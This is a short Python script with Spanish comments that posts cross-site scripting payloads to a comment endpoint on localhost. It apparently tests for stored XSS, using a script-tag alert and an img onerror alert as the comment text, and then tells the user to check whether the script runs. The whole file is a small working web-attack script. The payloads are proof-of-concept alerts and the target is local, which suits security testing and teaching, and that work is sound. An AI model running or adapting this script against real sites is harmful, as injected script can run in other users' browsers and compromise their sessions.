import requests

# Configuración
TARGET_URL = "http://localhost:3000/comment"  # Endpoint vulnerable
XSS_PAYLOAD = "<script>alert('XSS')</script>"  # Payload básico
ADVANCED_PAYLOAD = "<img src=x onerror='alert(\"XSS\")'>"  # Payload alternativo

def send_xss_attack():
    data = {
        "username": "attacker",
        "comment": XSS_PAYLOAD  # Cambiar a ADVANCED_PAYLOAD para pruebas avanzadas
    }
    
    try:
        response = requests.post(TARGET_URL, data=data)
        if response.status_code == 200:
            print("Payload XSS enviado con éxito")
            print("Revisa la aplicación web para ver si se ejecuta el script")
        else:
            print(f"Error en el envío - Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    send_xss_attack()